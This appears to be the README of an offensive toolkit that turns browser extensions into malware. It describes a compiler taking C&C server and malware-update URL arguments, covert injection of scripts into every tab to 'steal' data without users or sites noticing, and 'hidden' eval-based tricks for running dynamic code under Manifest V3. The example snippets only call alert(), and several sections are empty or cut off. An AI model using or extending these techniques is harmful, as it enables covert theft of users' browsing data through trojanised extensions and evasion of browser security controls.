# Maltensions
Post-Exploitation methods inside any extension


## How To Install/Test?
1. Select an Post-Exploitation module (i.e: tabs / mail / proxy / storage / etc).
2. Configure Post-Exploit arguments (variables at the begining).
3. Inject this module as script in background context.  

python3 compile_maltension.py <modules_list> -p <persistent - yes/no> -r <remote_cc_server> -u <malware_update_url> -f <output_format = file=pack=chrome-extension-unpacked-package/inj=Injectable-JS>

## Background extraction
1. Main Required permissions: tabs
2. The technique: Inject dynamic code to "steal" all info and return it back to background context with messaging, that way, users and sites aren't aware of data extraction (DevTools is empty), and the background context can send this data at arbtirary times when he is choosing to.
* Example code for dynamic execution:
```
chrome.tabs.executeScript(tabId= 1000, {code:"alert()", allFrames: true})
```

* In Manifest V3: tabs, scripting. 
* Even though mv3 doesn't natively support script execution - This is manifest-v3 compatible also (using function definition). 
* 		

* Tracking newly opened tabs:
chrome.tabs.onCreated.addListener(e=>console.log("New tab opened, ID=" + e.id + ", JSON Printing:" + JSON.stringify(e)));
* 


* Bonus - Hidden techniques for MV3:

1. Dynamic code execution from background: 
 ```
 chrome.tabs.create({active: false, 
 	'url': 'javascript:eval("alert(\\"dynamic code executed!\\")")'});
 ```

 Then, from the newly opened page - the malicious extension can then post messages back to background to call specific API's as needed.
2. Also, another way is to inject eval/other inline executionable function & then add argument for that function:

```
	function dynamicExec(code) {
		eval(code);
	}
    var results = await chrome.scripting.executeScript({
      target: {
        tabId: tab.id,
      },
      func: dynamicExec,
      args: ["alert('Dynamic code executed!');"],
    });
```

## Persistency & Configuration Features
Depending on the method of 

This example injects new configuration variable inside the background context of arbitrary extension.

The name of the configuration is configurable.


## Encrypted Storage & C&C



## Proxy Communication

Dependant on m